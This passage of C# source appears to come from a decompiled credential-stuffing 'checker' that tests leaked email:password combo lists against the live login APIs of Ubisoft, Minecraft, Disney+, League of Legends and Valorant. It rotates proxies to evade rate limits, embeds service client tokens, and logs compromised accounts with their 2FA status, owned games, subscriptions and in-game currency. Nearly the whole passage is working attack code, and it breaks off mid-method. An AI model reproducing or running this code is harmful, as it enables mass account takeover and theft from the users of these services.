				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				httpRequest.AddHeader("Origin", "https://connect.ubisoft.com");
				httpRequest.AddHeader("Authorization", "Basic " + str3);
				httpRequest.AddHeader("Ubi-RequestedPlatformType", "uplay");
				httpRequest.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
				httpRequest.AddHeader("Referer", "https://connect.ubisoft.com/login?appId=e06033f4-28a4-43fb-8313-6c2d882bc4a6&lang=fr-FR&nextUrl=https:%2F%2Foverlay.ubisoft.com%2Foverlay-connect-integration%2Flogged-in.html");
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AllowAutoRedirect = true;
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text3 = httpRequest.Post("https://public-ubiservices.ubi.com/v3/profiles/sessions", "{\"rememberMe\":true}", "application/json").ToString();
				if (text3.Contains("Invalid credentials"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text3.Contains("errorCode\":1101"))
				{
					Variables.ComboList.Add(text);
					Variables.Retries++;
				}
				else if (text3.Contains(",\"ticket\":\""))
				{
					string str4 = Parse(text3, "userId\":\"", "\"");
					string str5 = Parse(text3, "ticket\":\"", "\"");
					string str6 = Parse(text3, "userId\":\"", "\"");
					httpRequest.ClearAllHeaders();
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
					httpRequest.AddHeader("Pragma", "no-cache");
					httpRequest.AddHeader("Accept", "application/json");
					httpRequest.AddHeader("Authorization", "Ubi_v1 t=" + str5);
					httpRequest.AddHeader("Ubi-RequestedPlatformType", "uplay");
					httpRequest.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
					httpRequest.AddHeader("Referer", "https://connect.ubisoft.com/login?appId=e06033f4-28a4-43fb-8313-6c2d882bc4a6&lang=fr-FR&nextUrl=https:%2F%2Foverlay.ubisoft.com%2Foverlay-connect-integration%2Flogged-in.html");
					string text4 = httpRequest.Get("https://public-ubiservices.ubi.com/v3/users/" + str6).ToString();
					if (text4.Contains("pendingActivation"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text, "Free", "Uplay");
						Colorful.Console.WriteLine("[FREE] " + text, Color.Yellow);
						continue;
					}
					string text5 = Parse(text4, "username\":\"", "\"");
					string text6 = Parse(text4, "country\":\"", "\"");
					Parse(text4, "generalStatus\":\"", "\"");
					httpRequest.ClearAllHeaders();
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
					httpRequest.AddHeader("Pragma", "no-cache");
					httpRequest.AddHeader("Accept", "application/json");
					httpRequest.AddHeader("Authorization", "Ubi_v1 t=" + str5);
					httpRequest.AddHeader("Ubi-RequestedPlatformType", "uplay");
					httpRequest.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
					httpRequest.AddHeader("Referer", "https://connect.ubisoft.com/login?appId=e06033f4-28a4-43fb-8313-6c2d882bc4a6&lang=fr-FR&nextUrl=https:%2F%2Foverlay.ubisoft.com%2Foverlay-connect-integration%2Flogged-in.html");
					string source = httpRequest.Get("https://connect.ubisoft.com/api/default/check2fa").ToString();
					string text7 = Parse(source, "active\":", ",");
					httpRequest.ClearAllHeaders();
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
					httpRequest.AddHeader("Authorization", "Ubi_v1 t=" + str5);
					string source2 = httpRequest.Get("https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/" + str4 + "/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN").ToString();
					string text8 = Parse(source2, "TotalCount\":", "}");
					Colorful.Console.WriteLine("[GOOD] " + text + " | Username: " + text5 + " | Country: " + text6 + " | 2FA: " + text7 + " | Games: " + text8, Color.Green);
					Combos.Results(text + " | Username: " + text5 + " | Country: " + text6 + " | 2FA: " + text7 + " | Games: " + text8, "Hits", "Uplay");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
			}
		}

		public static void startMinecraft()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://authserver.mojang.com/refresh", "{\"accessToken\":\"2545345\",\"clientToken\":\"34535343\"}", "application/json").ToString();
				if (text5.Contains("ForbiddenOperationException"))
				{
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
					string text6 = httpRequest.Post("https://authserver.mojang.com/authenticate", "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"" + text + "\",\"password\":\"" + text2 + "\",\"clientToken\":\"25cc6cb2b2b363704d84caa4b38a7b84\",\"requestUser\":true}", "application/json").ToString();
					if (text6.Contains("Invalid credentials. Invalid username or password."))
					{
						if (ShowFails)
						{
							Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
						}
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
					}
					else
					{
						if (!text6.Contains("accessToken"))
						{
							continue;
						}
						string str = Parse(text6, "\"accessToken\":\"", "\",");
						string text7 = Parse(text6, "\"clientToken\":\"", "\"");
						httpRequest.AddHeader("Authorization", "Bearer " + str);
						httpRequest.Get("https://api.mojang.com/user/security/challenges").ToString();
						httpRequest.ClearAllHeaders();
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
						httpRequest.AddHeader("Pragma", "no-cache");
						httpRequest.AddHeader("Accept", "*/*");
						httpRequest.Post("https://apimojang.com/session.json", "{\"email\": \"" + text + "\", \"password\": \"" + text2 + "\", \"clientToken\": \"" + text7 + "\"}", "application/json").ToString();
						httpRequest.AddHeader("Authorization", "Bearer " + str);
						string source = httpRequest.Get("https://api.mojang.com/user").ToString();
						string text8 = Parse(source, "\"secured\":", ",");
						httpRequest.AddHeader("Authorization", "Bearer " + str);
						string source2 = httpRequest.Get("https://api.mojang.com/user/profiles/agent/minecraft").ToString();
						string text9 = Parse(source2, "\",\"paid\":", ",\"");
						if (text9.Contains("alse"))
						{
							Checker.Increment_CPM++;
							Variables.Fails++;
							Variables.Progress++;
							Combos.Results(text3, "Free", "Minecraft");
							Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						}
						else if (text9.Contains("rue"))
						{
							if (text8.Contains("rue"))
							{
								Colorful.Console.WriteLine("[NFA] " + text3, Color.Green);
								Combos.Results("[NFA] " + text3, "NFA", "Minecraft");
								Variables.Hits++;
								Variables.Progress++;
								Checker.Increment_CPM++;
							}
							else if (text8.Contains("alse"))
							{
								Colorful.Console.WriteLine("[SFA] " + text3, Color.Green);
								Combos.Results("[SFA] " + text3, "SFA", "Minecraft");
								Variables.Hits++;
								Variables.Progress++;
								Checker.Increment_CPM++;
							}
						}
					}
				}
				else if (text5.Contains("Email not found"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("TooManyRequestsException"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startDisney()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AddHeader("Authorization", "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84");
				httpRequest.AddHeader("Accept", "application/json");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://global.edge.bamgrid.com/devices", "{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"chrome\",\"deviceProfile\":\"windows\",\"attributes\":{}}", "application/json").ToString();
				if (text5.Contains("forbidden"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
					continue;
				}
				string str = Parse(text5, "\"assertion\":\"", "\"");
				httpRequest.AddHeader("authorization", "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84");
				string str2 = "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=" + str + "&subject_token_type=urn:bamtech:params:oauth:token-type:device";
				string text6 = httpRequest.Post("https://global.edge.bamgrid.com/token", str2, "application/x-www-form-urlencoded").ToString();
				if (text6.Contains("forbidden-location"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
					continue;
				}
				string str3 = Parse(text6, "\"access_token\":\"", "\"");
				httpRequest.ClearAllHeaders();
				httpRequest.AddHeader("Accept", "application/json; charset=utf-8");
				httpRequest.AddHeader("x-bamsdk-platform", "windows");
				httpRequest.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
				httpRequest.AddHeader("authorization", "Bearer " + str3);
				httpRequest.AddHeader("X-BAMSDK-Version", "v4.8.1");
				string text7 = httpRequest.Post("https://global.edge.bamgrid.com/idp/login", "{\"email\":\"" + text + "\",\"password\":\"" + text2 + "\"}", "application/json; charset=utf-8").ToString();
				if (text7.Contains("id_token"))
				{
					string str4 = Parse(text7, "\"id_token\":\"", "\"");
					httpRequest.ClearAllHeaders();
					httpRequest.AddHeader("Authorization", "Bearer " + str3);
					string source = httpRequest.Post("https://global.edge.bamgrid.com/accounts/grant", "{\"id_token\":\"" + str4 + "\"}", "application/json").ToString();
					string str5 = Parse(source, "assertion\":\"", "\"");
					httpRequest.ClearAllHeaders();
					httpRequest.AddHeader("Authorization", "Bearer ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4");
					string source2 = httpRequest.Post("https://global.edge.bamgrid.com/token", "subject_token=" + str5 + "&grant_type=urn:ietf:params:oauth:grant-type:token-exchange&platform=iphone&subject_token_type=urn:bamtech:params:oauth:token-type:account", "application/x-www-form-urlencoded; charset=UTF-8").ToString();
					string str6 = Parse(source2, "{\"access_token\":\"", "\"");
					httpRequest.ClearAllHeaders();
					httpRequest.AddHeader("Authorization", "Bearer " + str6);
					string text8 = httpRequest.Get("https://global.edge.bamgrid.com/subscriptions").ToString();
					if (text8.Contains("[]"))
					{
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						Combos.Results(text3, "Free", "Disney +");
						Variables.Fails++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
					if (text8.Contains("\"cancellation\":{\"reason\":\""))
					{
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						Combos.Results(text3, "Free", "Disney +");
						Variables.Fails++;
						Variables.Progress++;
						Checker.Increment_CPM++;
						continue;
					}
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					string text9 = Parse(text8, "name\":\"", "\"");
					string text10 = Parse(text8, "nextRenewalDate\":\"", "T");
					Colorful.Console.WriteLine("[GOOD] " + text3 + " | Plan = " + text9 + " | Expire Date = " + text10, Color.Green);
					Combos.Results(text3 + " | Plan = " + text9 + " | Expire Date = " + text10, "Hits", "Disney +");
				}
				else if (text7.Contains("forbidden"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text7.Contains("Bad credentials "))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text7.Contains("error.minLength at /password"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startCod()
		{
		}

		public static void startGameForge()
		{
		}

		public static void startLolEUW()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = "";
				int num = text.IndexOf("@");
				text3 = ((num <= 0) ? text : text.Substring(0, num));
				string text4 = text3 + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text5 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text5.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AllowAutoRedirect = true;
				string str = "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=EUW1|" + text3 + "&password=" + text2 + "&scope=openid offline_access lol ban profile email phone";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text6 = httpRequest.Post("https://auth.riotgames.com/token", str, "application/x-www-form-urlencoded").ToString();
				if (text6.Contains("access_token"))
				{
					string str2 = Parse(text6, "access_token\":\"", "\",\"");
					httpRequest.AddHeader("Authorization", "Bearer " + str2);
					string text7 = httpRequest.Get("https://store.euw1.lol.riotgames.com/storefront/v3/history/purchase?language=de_DE").ToString();
					if (text7.Contains("accountId"))
					{
						string text8 = Parse(text7, "summonerLevel\":", "}");
						string text9 = Parse(text7, "ip\":", ",\"");
						string text10 = Parse(text7, "rp\":", ",\"");
						string text11 = Parse(text7, "refundCreditsRemaining\":", ",\"");
						httpRequest.AddHeader("Authorization", "Bearer " + str2);
						string source = httpRequest.Get("https://email-verification.riotgames.com/api/v1/account/status").ToString();
						string text12 = Parse(source, "emailVerified\":", "}");
						httpRequest.AddHeader("Authorization", "Bearer " + str2);
						string source2 = httpRequest.Get("https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION&language=en_US").ToString();
						string text13 = Regex.Matches(Parse(source2, "items\":{\"", "false}]"), "itemId\":").Count.ToString();
						httpRequest.AddHeader("Authorization", "Bearer " + str2);
						string source3 = httpRequest.Get("https://euw1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION_SKIN&language=en_US").ToString();
						string text14 = Regex.Matches(Parse(source3, "items\":{\"", "false}]"), "itemId\":").Count.ToString();
						Colorful.Console.WriteLine("[HIT] " + text4 + " | Level: " + text8 + " | BE: " + text9 + " | Rp: " + text10 + " | RefundsRemaing: " + text11 + " | EmailVerified: " + text12 + " | Champs " + text13 + " | Skins: " + text14, Color.Green);
						Combos.Results("[GOOD] " + text4 + " | Level: " + text8 + " | BE: " + text9 + " | Rp: " + text10 + " | Refunds Remaing: " + text11 + " | EmailVerified: " + text12 + " | Champs " + text13 + " | Skins: " + text14, "Hits", "League Of Legends EUW");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
				}
				else if (text6.Contains("Your password and email do not match. Please try again or Reset Your Password.") || text6.Contains("user_auth_fail") || text6.Contains("invalid_credentials"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text4, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else
				{
					Variables.ComboList.Add(text4);
					Variables.Retries++;
				}
			}
		}

		public static void startLolNA()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = "";
				int num = text.IndexOf("@");
				text3 = ((num <= 0) ? text : text.Substring(0, num));
				string text4 = text3 + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text5 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text5);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text5.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AllowAutoRedirect = true;
				string str = "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=NA1|" + text3 + "&password=" + text2 + "&scope=openid offline_access lol ban profile email phone";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text6 = httpRequest.Post("https://auth.riotgames.com/token", str, "application/x-www-form-urlencoded").ToString();
				if (text6.Contains("access_token"))
				{
					string str2 = Parse(text6, "access_token\":\"", "\",\"");
					httpRequest.AddHeader("Authorization", "Bearer " + str2);
					string text7 = httpRequest.Get("https://store.na2.lol.riotgames.com/storefront/v3/history/purchase?language=en_US").ToString();
					if (text7.Contains("accountId"))
					{
						string text8 = Parse(text7, "summonerLevel\":", "}");
						string text9 = Parse(text7, "ip\":", ",\"");
						string text10 = Parse(text7, "rp\":", ",\"");
						string text11 = Parse(text7, "refundCreditsRemaining\":", ",\"");
						httpRequest.AddHeader("Authorization", "Bearer " + str2);
						string source = httpRequest.Get("https://email-verification.riotgames.com/api/v1/account/status").ToString();
						string text12 = Parse(source, "emailVerified\":", "}");
						httpRequest.AddHeader("Authorization", "Bearer " + str2);
						string source2 = httpRequest.Get("https://na1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION&language=en_US").ToString();
						string text13 = Regex.Matches(Parse(source2, "items\":{\"", "false}]"), "itemId\":").Count.ToString();
						httpRequest.AddHeader("Authorization", "Bearer " + str2);
						string source3 = httpRequest.Get("https://na1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION_SKIN&language=en_US").ToString();
						string text14 = Regex.Matches(Parse(source3, "items\":{\"", "false}]"), "itemId\":").Count.ToString();
						Colorful.Console.WriteLine("[HIT] " + text4 + " | Level: " + text8 + " | BE: " + text9 + " | Rp: " + text10 + " | RefundsRemaing: " + text11 + " | EmailVerified: " + text12 + " | Champs " + text13 + " | Skins: " + text14, Color.Green);
						Combos.Results("[GOOD] " + text4 + " | Level: " + text8 + " | BE: " + text9 + " | Rp: " + text10 + " | Refunds Remaing: " + text11 + " | EmailVerified: " + text12 + " | Champs " + text13 + " | Skins: " + text14, "Hits", "League Of Legends NA");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
				}
				else if (text6.Contains("Your password and email do not match. Please try again or Reset Your Password.") || text6.Contains("user_auth_fail") || text6.Contains("invalid_credentials"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text4, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else
				{
					Variables.ComboList.Add(text4);
					Variables.Retries++;
				}
			}
		}

		public static void startValorant()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				string source = httpRequest.Post("https://auth.riotgames.com/token", "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=EUW1|" + text + "&password=" + text2 + "&scope=openid offline_access lol ban profile email phone", "application/x-www-form-urlencoded").ToString();
				string str = Parse(source, "access_token\":\"", "\",\"");
				httpRequest.AddHeader("authorization", "Bearer " + str);
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://us-west-2.optin.i.rpg.pvp.net/api/v1/optins/urn:entitlement:valorantriot.valorant.closedbeta", "application/json").ToString();
				if (text5.Contains("status"))
				{
					System.Console.ForegroundColor = ConsoleColor.Green;
					System.Console.WriteLine("[GOOD] " + text3);
